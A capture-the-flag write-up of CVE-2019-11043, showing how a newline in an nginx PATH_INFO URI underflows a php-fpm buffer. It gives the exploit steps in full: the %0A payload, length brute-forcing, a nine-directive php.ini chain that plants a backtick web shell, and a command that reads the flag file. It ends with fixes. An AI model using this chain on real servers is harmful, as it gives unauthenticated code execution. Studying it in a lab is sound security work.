# 17 — From CTF to Real World (php-fpm buffer underflow) — Writeup

## TL;DR

* nginx's `fastcgi_split_path_info ^(.+?\.php)(/.*)$` cannot match a URI that
  contains a newline (`.` never matches `\n`), so `$fastcgi_path_info` is empty and
  nginx sends `PATH_INFO=""`.
* php-fpm's `init_request_info()` computes `path_info = env_path_info + pilen - slen`
  with `pilen == 0`. The pointer underflows out of the FastCGI environment buffer,
  and php-fpm then writes a single `0x00` there.
* Land that byte on the least-significant byte of `pos`, the write cursor of the
  bump allocator that holds all FastCGI variables, and the next variable php-fpm
  stores is written on top of variables already stored. Aim it at `PHP_VALUE` and
  every request carries one `php.ini` directive — which php-fpm applies to the
  worker's *master* ini value, so it persists.
* Nine directives later, php-fpm's own "unable to load extension" error message is
  valid PHP containing `` `$_GET[a]` ``, is written to a file which is also the
  `auto_prepend_file`, and you have a shell.
* Flag: `PHRACK{one_null_byte_walked_backwards_into_php_fpm}`.

## The bug

### 1. The nginx configuration, line by line

`challenge/nginx/default.conf`:

```nginx
location ~ [^/]\.php(/|$) {
    fastcgi_split_path_info ^(.+?\.php)(/.*)$;
    include        fastcgi_params;
    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
    fastcgi_param  PATH_INFO        $fastcgi_path_info;
    fastcgi_pass   php:9000;
    fastcgi_index  index.php;
}
```

* `location ~ [^/]\.php(/|$)` — anything containing `.php` followed by `/` or by
  end-of-URI is FastCGI'd, **including paths that do not exist on disk**. This is
  the "PATH_INFO style" location everybody copy-pastes so that
  `/index.php/controller/action` works.
* `fastcgi_split_path_info ^(.+?\.php)(/.*)$` — splits the URI into
  `$fastcgi_script_name` (capture 1) and `$fastcgi_path_info` (capture 2). The
  regexp is anchored at both ends and `.` does not match `\n` in PCRE. So for
  `/index.php/PHP_VALUE%0Ashort_open_tag=1`, nginx unescapes `%0A` into a real
  newline in `$uri`, the regexp fails to match anything at all, and **both**
  captures are empty. `$fastcgi_script_name` falls back to the full `$uri`;
  `$fastcgi_path_info` stays empty.
* `fastcgi_param PATH_INFO $fastcgi_path_info;` — the empty value is sent anyway,
  as an empty FastCGI variable. php-fpm therefore sees `PATH_INFO` *present* and
  *zero length*, a combination the code below was never written for. The parameter
  is also defined **after** `include fastcgi_params`, i.e. after `REQUEST_URI`,
  which is the ordering the exploit's arithmetic assumes.
* **no `try_files`** — nothing checks that the script exists before handing the
  request to php-fpm. This single omission is what makes the whole thing
  reachable, and adding it back is the official workaround.

### 2. The underflow

`sapi/fpm/fpm/fpm_main.c`, `init_request_info()` (PHP 7.2.23, around line 1200).
We get here because `SCRIPT_FILENAME` (`/var/www/html/index.php/PHP_VALUE\n...`)
does not exist, so with `cgi.fix_pathinfo=1` (the default) php-fpm walks the path
backwards looking for something that does, finds `/var/www/html/index.php`, and
then tries to reconstruct `PATH_INFO` from what it chopped off:

```c
int ptlen = strlen(pt);                                      /* the real script     */
int slen = len - ptlen;                                      /* what we chopped off */
int pilen = env_path_info ? strlen(env_path_info) : 0;       /* == 0, thanks nginx  */
int tflag = 0;
char *path_info;
if (apache_was_here) {
    /* recall that PATH_INFO won't exist */
    path_info = script_path_translated + ptlen;
    tflag = (slen != 0 && (!orig_path_info || strcmp(orig_path_info, path_info) != 0));
} else {
    path_info = env_path_info ? env_path_info + pilen - slen : NULL;   /* [1] */
    tflag = (orig_path_info != path_info);
}

if (tflag) {
    if (orig_path_info) {
        char old;

        FCGI_PUTENV(request, "ORIG_PATH_INFO", orig_path_info);
        old = path_info[0];
        path_info[0] = 0;                                             /* [2] */
        if (!orig_script_name ||
            strcmp(orig_script_name, env_path_info) != 0) {
            ...
            SG(request_info).request_uri = FCGI_PUTENV(request, "SCRIPT_NAME", env_path_info);  /* [3] */
        } else { ... }
        path_info[0] = old;
    }
    ...
    env_path_info = FCGI_PUTENV(request, "PATH_INFO", path_info);     /* [4] */
}
```

`[1]` is the bug. `env_path_info` is a valid pointer (the empty string stored for
the empty `PATH_INFO` variable), `pilen` is `0`, and `slen` is the length of the
part of the URI that was chopped off — in our case ~34 bytes. The result points
**34 bytes before** the empty string, i.e. into whatever precedes it in the
environment buffer. `[2]` then writes one `0x00` there.

The fix in 7.2.24 / 7.1.33 / 7.3.11 is a single condition:

```c
-   path_info = env_path_info ? env_path_info + pilen - slen : NULL;
+   path_info = (env_path_info && pilen > slen) ? env_path_info + pilen - slen : NULL;
```

### 3. Where the byte lands

All FastCGI variables live in `main/fastcgi.c`'s bump allocator:

```c
typedef struct _fcgi_data_seg {
	char                  *pos;     /* write cursor            */
	char                  *end;
	struct _fcgi_data_seg *next;
	char                   data[1]; /* the strings themselves  */
} fcgi_data_seg;
```

`fcgi_hash_strndup()` copies a string to `h->data->pos` and bumps the cursor:

```c
	ret = h->data->pos;
	memcpy(ret, str, str_len);
	ret[str_len] = 0;
	h->data->pos += str_len + 1;
```

Segments are `FCGI_HASH_SEG_SIZE` = 4096 bytes and are pushed onto a linked list,
so `request->env.data` is always the **newest** segment. If the environment grows
past the end of one segment, a fresh one is allocated and the variables that come
next are stored at its very beginning — a couple of bytes after the `pos` field
itself. That is the alignment the exploit engineers: make the total environment
long enough that `env_path_info` sits near the start of a new segment, and
`env_path_info - slen` lands exactly on `&data->pos`'s low byte.

Orange Tsai's article shows the moment in gdb: `path_info` and `request.env.data`
hold the same address, and after the write `pos` has moved from `...f731` to
`...f700`. The cursor has been rewound by up to 255 bytes, straight into data that
has already been written.

Everything that php-fpm stores from then on — `[3]` and `[4]` above, plus
`ORIG_SCRIPT_NAME`, `PATH_TRANSLATED`, `SCRIPT_FILENAME` — is memcpy'd over the
top of variables that are already there. Choose the lengths correctly and the
overwrite manufactures a variable named `PHP_VALUE` whose value is the text you
placed in the URI after the newline.

Two knobs control "the lengths":

* `qsl` — the length of the query string. It appears **twice** in the environment
  (`QUERY_STRING` and inside `REQUEST_URI`), so one character of query moves the
  layout by two bytes; that is the `qslDelta/2` correction in the exploit.
* `pisos` — the length of a junk request header (`D-Pisos: 8====...D`). nginx
  forwards unknown headers as `HTTP_*` variables, so this is a one-byte-granularity
  vernier on top of the two-byte query-string steps.

Neither can be computed in advance from outside — they depend on the docroot
length, the script name, nginx's `fastcgi_params` file and every other header — so
the exploit brute-forces them.

### 4. Why `PHP_VALUE` is the jackpot

`fpm_main.c` reads it at the start of every request:

```c
	ini = FCGI_GETENV(request, "PHP_VALUE");
	if (ini) {
		int mode = ZEND_INI_USER;
		char *tmp;
		spprintf(&tmp, 0, "%s\n", ini);
		zend_parse_ini_string(tmp, 1, ZEND_INI_SCANNER_NORMAL, (zend_ini_parser_cb_t)fastcgi_ini_parser, &mode);
		efree(tmp);
	}
```

which ends in `fpm_php_zend_ini_alter_master()` (`sapi/fpm/fpm/fpm_php.c`):

```c
	duplicate = zend_string_init(new_value, new_value_length, 1);
	if (!ini_entry->on_modify || ini_entry->on_modify(...) == SUCCESS) {
		ini_entry->value = duplicate;
```

It overwrites the **master** value of the ini entry in that worker process. It is
not a per-request override and nothing restores it at the end of the request. So
each successful poisoning request permanently changes one directive in one worker,
and the directives accumulate. (That is also why the exploit is "sticky" and why
neex's README warns that you may leave a server in a strange state.)

One more gift, in `fpm_php_apply_defines_ex()`:

```c
	if (!strcmp(name, "extension") && *value) {
		zval zv;
		php_dl(value, MODULE_PERSISTENT, &zv, 1);
		return Z_TYPE(zv) == IS_TRUE;
	}
```

`extension=` is not an ini write at all — it is a `dlopen()` of
`extension_dir + "/" + value`, and when it fails PHP logs the full path it tried.
Both halves of that path are attacker-controlled directives.

## Building the exploit

### Step 1 — see the anomaly

```console
$ curl -s -o /dev/null -w '%{http_code}\n' 'http://127.0.0.1:8017/index.php/AAAA'
200
$ curl -s -o /dev/null -w '%{http_code}\n' 'http://127.0.0.1:8017/index.php/path%0Ainfo.php'
200
```

Both 200 — the page still renders, because `cgi.fix_pathinfo` found `index.php`
anyway. But drop a script that prints `$_SERVER` into the docroot for a moment and
the damage is already visible:

```console
$ curl -s 'http://127.0.0.1:8017/dbg.php/AAAA'
SCRIPT_FILENAME  = '/var/www/html/dbg.php'
SCRIPT_NAME      = '/dbg.php'
PATH_INFO        = '/AAAA'

$ curl -s 'http://127.0.0.1:8017/dbg.php/PHP_VALUE%0Ashort_open_tag=1'
SCRIPT_FILENAME  = '/var/www/html/dbg.php'
SCRIPT_NAME      = ''
PATH_INFO        = 'short_open_tag=1'          <= we never sent this
PATH_TRANSLATED  = '/var/www/htmlshort_open_tag=1'
DOCUMENT_URI     = '/dbg.php/PHP_VALUE
short_open_tag=1'
```

nginx sent `PATH_INFO=""`. What PHP reports is the text that follows the newline in
a *different* variable, because the underflowed pointer landed in the middle of
`DOCUMENT_URI`'s stored bytes and php-fpm stored that address back as `PATH_INFO`.
This is exactly the anomaly @d90pwn noticed during Real World CTF: a URL with a
newline in it makes the server answer with pieces of its own memory.

The interesting signal for exploitation, though, is not one response — it is how
the response changes with the *length* of the request.

### Step 2 — sweep the query-string length

Send the same newline payload with query strings of increasing length and watch
for an outlier. This is what `detect()` in `solve/solve.py` does — one request per
length, comparing against a baseline:

```console
[*] base status code is 200
[*] status 502 for qsl=1765 - candidate
[+] target is vulnerable; qsl candidates: [1755, 1760, 1765]
```

A 502 is nginx saying the FastCGI peer went away: at `qsl=1765` the NUL byte lands
somewhere fatal and the worker dies. That is the vulnerability confirmed, with a
starting point for the arithmetic. (neex's tool sweeps 1500–1950 in steps of 5 and
then also tries `candidate-5` and `candidate-10`, because the byte that kills the
worker and the byte that lands on `pos` are near each other but not identical.)

### Step 3 — find `pisos` with a harmless oracle

For each candidate `qsl`, try every junk-header length from 1 to 256 with a
payload that sets a directive whose effect is visible from outside:

```
PATH_INFO = /PHP_VALUE\nsession.auto_start=1;;;
```

padded with `;` to exactly 34 bytes. If the response comes back with a
`Set-Cookie: PHPSESSID=...` header, PHP started a session on a page that never
calls `session_start()` — the overwrite worked, and we now know both lengths:

```
[+] attack params found: qsl=1755 pisos=75 (172 requests)
```

The exploit then sets `session.auto_start=0` fifty times to put the worker back.

### Step 4 — the php.ini chain

@beched's nine directives, one per request:

| directive | why |
| --- | --- |
| `short_open_tag=1` | so `<?=` opens a PHP tag |
| `html_errors=0` | keep markup out of the error log |
| `include_path=/tmp` | where `auto_prepend_file` will look |
| `auto_prepend_file=a` | include `/tmp/a` before every script |
| `log_errors=1` | write errors to a file |
| `error_reporting=2` | `E_WARNING`, enough for the message we want |
| `error_log=/tmp/a` | **the error log is the prepended file** |
| ``extension_dir="<?=` "`` | first half of the shell |
| ``extension="$_GET[a]` ?>"`` | second half |

The last two make `php_dl()` try to load
`` <?=`/$_GET[a]`?> `` and fail; PHP logs *"Unable to load dynamic library
'<?=`/$_GET[a]`?>'"* into `/tmp/a`; `/tmp/a` is `auto_prepend_file`; the next
request includes it, `short_open_tag` makes `<?=` valid, and the backticks run a
shell command. Note the leading `/` that `php_dl` inserts between directory and
filename — that is why the command starts with `/`: `a=/bin/cat+/flag.txt` becomes
`` `//bin/cat /flag.txt` ``, and `//bin/cat` is a perfectly good path.

Because the directives must all land in the *same* worker, the loop just keeps
going until one request comes back with the output:

```console
$ docker compose --profile solve run --rm solver
[*] base status code is 200
[*] status 502 for qsl=1765 - candidate
[+] target is vulnerable; qsl candidates: [1755, 1760, 1765]
[+] attack params found: qsl=1755 pisos=75 (172 requests)
[*] poisoning php.ini, one directive per request
[+] command execution after 6 rounds / 276 requests
FLAG: PHRACK{one_null_byte_walked_backwards_into_php_fpm}
```

## The exploit

`solve/solve.py` is a from-scratch Python reimplementation of neex's
`phuip-fpizdam`, using the same constants and the same three phases. Stdlib only;
no FastCGI client is needed because everything is driven through nginx over HTTP.

* `escape_path()` reproduces Go's `url.EscapedPath()` byte-for-byte. This matters:
  the query-string length is computed relative to how many bytes percent-encoding
  adds to `REQUEST_URI`, and getting it wrong by one shifts every offset.
* `Requester.request()` builds `GET <script><path info>?<prefix><Q...>` with
  `qsl_prime = qsl - qsl_delta/2 - len(prefix)`, and sets the three headers the
  original tool sends (`User-Agent`, `D-Pisos`, `Ebut`) so the environment size
  matches.
* `detect()` — base status, `qsl` sweep (1500..1950 step 5), candidate extension,
  a sanity check that the target is not already poisoned, then the
  `session.auto_start` oracle over `pisos` 1..256.
* `attack()` — cycles the nine directives with `?a=/bin/cat+/flag.txt&` prefixed to
  the query string until the flag appears in a response body.
* `main()` retries the whole thing until a wall-clock budget expires; memory
  corruption is allowed to fail, and a half-poisoned worker shifts the parameters,
  so re-detection per round is the right recovery.

Measured on this lab (two workers, fixed pool): the flag comes out on the **first**
attempt every time, after roughly **200–280 HTTP requests** and well under a
second. Against a bigger, `pm = dynamic` pool expect several rounds.

## Fixing it

**The one-line fix, in nginx:**

```nginx
location ~ [^/]\.php(/|$) {
    fastcgi_split_path_info ^(.+?\.php)(/.*)$;
    try_files $fastcgi_script_name =404;     # <-- this
    ...
}
```

`try_files` makes nginx resolve the script itself and return 404 when it does not
exist, so the crafted URI never reaches php-fpm. `challenge/nginx/default.fixed.conf`
is the complete fixed server block; diff it against `default.conf`.

Other layers worth having:

* **Patch PHP**: 7.1.33, 7.2.24, 7.3.11 or later. The fix (`pilen > slen`) is two
  words long.
* **Do not forward unknown paths to FastCGI at all.** A `location ~ \.php$` that
  matches only real files, plus an explicit front-controller rule, removes the
  whole PATH_INFO dance.
* `cgi.fix_pathinfo=0` prevents php-fpm from walking the path backwards, which
  also prevents reaching the vulnerable branch — and closes the much older
  "upload `avatar.png`, request `avatar.png/x.php`" family at the same time.
* `security.limit_extensions` in the pool config is a useful backstop, though it
  does not stop this particular bug (the resolved script does end in `.php`).

**Blast radius, honestly:** the vulnerable `location` block was in a *lot* of
copy-pasted configurations (NextCloud's recommended config among them), because
`fastcgi_split_path_info` + `PATH_INFO` is what makes pretty URLs work with
FastCGI. The result is unauthenticated remote code execution as the pool user,
from a single GET request, against a stack with no application bug whatsoever.
Mass scanning started within days of the October 2019 disclosure. What makes it
notable rather than merely bad is the exploitation model: no leak, no write
primitive, no code pointer — one NUL byte plus an allocator's write cursor is the
entire memory-corruption budget, and everything after that is data. It is also a
good argument for why "fuzz the parser" would never have found it: you need a
specific nginx quirk, a specific configuration idiom, and a heap layout that only
exists when the environment is a few hundred bytes long.

## Going further

* Run the original tool and compare: `go install github.com/neex/phuip-fpizdam@latest`,
  then `phuip-fpizdam http://127.0.0.1:8017/index.php`. Same numbers.
* Swap the image for `php:7.1.32-fpm` in `challenge/Dockerfile.fpm` and re-run —
  the constants move (here: `qsl=1760`, `pisos=6`, flag after 171 requests) but the
  attack is unchanged. Then swap to `php:7.4-fpm` and watch every round report
  `no qsl candidate: target looks patched` until the budget runs out. That is the
  cleanest demonstration that the lab depends on the bug and not on the setup.
* Point the fixed nginx config (`default.fixed.conf`) at the *unpatched* php-fpm
  and confirm the sweep goes quiet: configuration is a real mitigation here.
* Change `pm.max_children` to 20 in `challenge/fpm/zzz-lab.conf` and count how many
  more rounds the attack needs. That number is the practical meaning of "only some
  of the workers are infected".
* Reproduce the article's gdb session: `docker compose exec -u root php sh -c
  'apt-get update && apt-get install -y gdb'`, attach to a worker, break on
  `fpm_main.c:1222` (`path_info[0] = 0`) and print `*request.env.data` before and
  after the write. `pos` moves backwards, and that is the whole exploit.
* `--kill-workers` in the original tool is the same primitive aimed at a fatal
  offset. Availability impact, no RCE needed.

## References

* Orange Tsai, *"The Art of PHP - My CTF Journey and Untold Stories!"*, Phrack #72,
  section 5.2.
* Emil "neex" Lerner, *PHuiP-FPizdaM* — <https://github.com/neex/phuip-fpizdam>
  (and the ZeroNights 2019 slides in that repository).
* Orange Tsai, *"An Analysis and Thought about Recently Uncovered CVE-2019-11043"*,
  <https://blog.orange.tw/2019/10/an-analysis-and-thought-about-recently.html>
* Original anomaly: **@d90pwn** at Real World CTF 2019; php.ini chain: **@beched**.
* php-src: `sapi/fpm/fpm/fpm_main.c`, `sapi/fpm/fpm/fpm_php.c`, `main/fastcgi.c`
  and `main/fastcgi.h` — compare tags `php-7.2.23` and `php-7.2.24`.
* PHP bug #78599, *"env_path_info underflow in fpm_main.c can lead to RCE"* —
  <https://bugs.php.net/bug.php?id=78599>
* NVD: [CVE-2019-11043](https://nvd.nist.gov/vuln/detail/CVE-2019-11043).
